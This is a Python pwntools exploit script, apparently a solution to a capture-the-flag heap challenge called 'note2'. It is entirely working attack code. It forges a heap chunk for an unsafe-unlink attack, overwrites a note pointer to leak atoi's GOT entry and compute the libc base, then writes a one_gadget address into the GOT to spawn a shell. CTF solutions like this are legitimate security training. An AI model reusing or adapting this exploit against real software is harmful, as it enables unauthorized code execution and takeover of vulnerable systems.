from pwn import *
import binascii

DEBUG = 0
io = process("./note2")
e = ELF("./note2")
libc = ELF("./libc-2.23.so")
if DEBUG ==1:
	context.log_level = "debug"
	context.terminal = ["/usr/bin/tmux", "splitw", "-h", "-p", "70"]

def new_note(size, content):
	io.recvuntil(b">>")
	io.sendline(b"1")
	io.recvuntil(b")")
	io.sendline(str(size))
	io.recvuntil(b":")
	io.sendline(content)

def show_note(index):
	io.recvuntil(b">>")
	io.sendline(b"2")
	io.recvuntil(b":")
	io.sendline(str(index))

def edit_note(index, choice, content):
	io.recvuntil(b">>")
	io.sendline(b"3")
	io.recvuntil(b":")
	io.sendline(str(index))
	io.recvuntil(b"]")
	io.sendline(str(choice))
	io.recvuntil(b":")
	io.sendline(content)

def delete_note(index):
	io.recvuntil(b">>")
	io.sendline(b"4")
	io.recvuntil(b":")
	io.sendline(str(index))

io.recvuntil(b":")
io.sendline(b"/bin/sh")
io.recvuntil(b":")
io.sendline(b"aaa")

ptr_0 = 0x602120
fake_fd = ptr_0 - 0x18
fake_bk = ptr_0 - 0x10
note0_content = b"\x00" * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)
new_note(0x80, note0_content)
new_note(0x0, b"aa")
new_note(0x80, b"bb")

delete_note(1)
note1_content = b"\x00" * 16 + p64(0xa0) + p64(0x90)
new_note(0x0, note1_content)

delete_note(2)

free_got = e.got["atoi"]
payload = 0x18 * b"a" + p64(free_got)
edit_note(0, 1, payload)

show_note(0)
io.recvuntil(b"is ")

free_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc_addr = free_addr - libc.symbols["atoi"]
print("libc address: " + hex(libc_addr))

system_addr = libc_addr + libc.symbols["system"]
one_gadget = libc_addr + 0xf02a4
edit_note(0, 1, p64(one_gadget))
io.sendline(b"1")

io.interactive()
